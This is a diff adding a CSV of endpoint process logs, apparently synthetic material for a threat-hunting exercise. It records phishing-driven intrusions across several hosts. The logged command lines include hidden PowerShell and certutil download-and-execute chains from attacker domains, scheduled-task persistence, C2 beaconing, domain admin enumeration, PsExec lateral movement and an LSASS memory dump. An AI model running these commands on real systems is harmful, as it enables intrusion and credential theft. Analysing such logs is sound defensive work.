@@ -1,0 +1,30 @@
+_time,host_ip,user,process_name,command_line,action
+2026-04-10T10:46:00,192.168.1.50,jsmith,chrome.exe,chrome.exe --single-argument http://update-microsoft-support.com/login,Allowed
+2026-04-10T10:47:15,192.168.1.50,jsmith,cmd.exe,"cmd.exe /c powershell.exe -w hidden -ep bypass -c ""Invoke-WebRequest -Uri http://update-microsoft-support.com/payload.exe -OutFile C:\Temp\payload.exe; Start-Process C:\Temp\payload.exe""",Allowed
+2026-04-10T10:47:20,192.168.1.50,jsmith,payload.exe,C:\Temp\payload.exe,Allowed
+2026-04-10T10:48:00,192.168.1.50,jsmith,schtasks.exe,"schtasks /create /sc onlogon /tn ""WindowsUpdate"" /tr C:\Temp\payload.exe /rl highest",Allowed
+2026-04-10T10:49:00,192.168.1.50,jsmith,payload.exe,C:\Temp\payload.exe -beacon -interval 300 -c2 185.220.101.45:443,Allowed
+2026-04-10T11:10:05,192.168.1.51,tstark,chrome.exe,chrome.exe --single-argument http://update-microsoft-support.com/login,Allowed
+2026-04-11T09:15:30,192.168.1.52,amorales,chrome.exe,chrome.exe --single-argument http://hr-benefits-portal.com/verify,Allowed
+2026-04-11T09:16:45,192.168.1.52,amorales,chrome.exe,chrome.exe --form-submit http://hr-benefits-portal.com/verify?action=login,Allowed
+2026-04-11T09:17:00,192.168.1.52,amorales,powershell.exe,"powershell.exe -w hidden -c ""Get-Clipboard | Out-File C:\Users\amorales\AppData\Local\Temp\cb.txt""",Allowed
+2026-04-11T09:22:10,192.168.1.53,bwilson,chrome.exe,chrome.exe --single-argument http://hr-benefits-portal.com/verify,Allowed
+2026-04-11T09:45:15,192.168.1.54,cjones,chrome.exe,chrome.exe --single-argument http://hr-benefits-portal.com/verify,Allowed
+2026-04-11T09:46:00,192.168.1.54,cjones,chrome.exe,chrome.exe --form-submit http://hr-benefits-portal.com/verify?action=login,Allowed
+2026-04-11T09:47:30,192.168.1.54,cjones,net.exe,net.exe user /domain,Allowed
+2026-04-11T09:48:00,192.168.1.54,cjones,net.exe,"net.exe group ""Domain Admins"" /domain",Allowed
+2026-04-11T09:49:00,192.168.1.54,cjones,PsExec.exe,PsExec.exe \\192.168.1.60 cmd.exe /c whoami,Blocked
+2026-04-11T09:50:00,192.168.1.54,cjones,rundll32.exe,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 624 C:\Temp\lsass.dmp full,Blocked
+2026-04-12T08:10:15,192.168.1.56,efoster,chrome.exe,chrome.exe --single-argument https://helpdesk.yourcompany.com/ticket/2847,Allowed
+2026-04-12T08:11:00,192.168.1.56,efoster,outlook.exe,outlook.exe,Allowed
+2026-04-12T08:15:00,192.168.1.56,efoster,Teams.exe,Teams.exe --system-initiated,Allowed
+2026-04-12T13:01:00,192.168.1.50,jsmith,chrome.exe,chrome.exe --single-argument http://vendor-portal-update.com/patch,Allowed
+2026-04-12T13:01:30,192.168.1.50,jsmith,EXCEL.EXE,EXCEL.EXE C:\Users\jsmith\Downloads\security_patch_v2.xlsm,Allowed
+2026-04-12T13:02:00,192.168.1.50,jsmith,mshta.exe,"mshta.exe vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"certutil -urlcache -split -f http://vendor-portal-update.com/update.dll C:\Temp\update.dll"""", 0:close"")",Allowed
+2026-04-12T13:02:30,192.168.1.50,jsmith,certutil.exe,certutil.exe -urlcache -split -f http://vendor-portal-update.com/update.dll C:\Temp\update.dll,Allowed
+2026-04-12T13:03:00,192.168.1.50,jsmith,rundll32.exe,"rundll32.exe C:\Temp\update.dll,DllMain",Allowed
+2026-04-12T13:20:10,192.168.1.57,gthomas,chrome.exe,chrome.exe --single-argument http://vendor-portal-update.com/patch,Allowed
+2026-04-12T13:35:15,192.168.1.59,hlee,chrome.exe,chrome.exe --single-argument http://vendor-portal-update.com/patch,Allowed
+2026-04-12T13:35:45,192.168.1.59,hlee,EXCEL.EXE,EXCEL.EXE C:\Users\hlee\Downloads\security_patch_v2.xlsm,Allowed
+2026-04-12T13:36:15,192.168.1.59,hlee,powershell.exe,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA,Allowed
+2026-04-12T13:37:00,192.168.1.59,hlee,powershell.exe,"powershell.exe -w hidden -c ""while($true){IEX(IWR http://vendor-portal-update.com/beacon -UseBasicParsing);Start-Sleep -s 300}""",Allowed
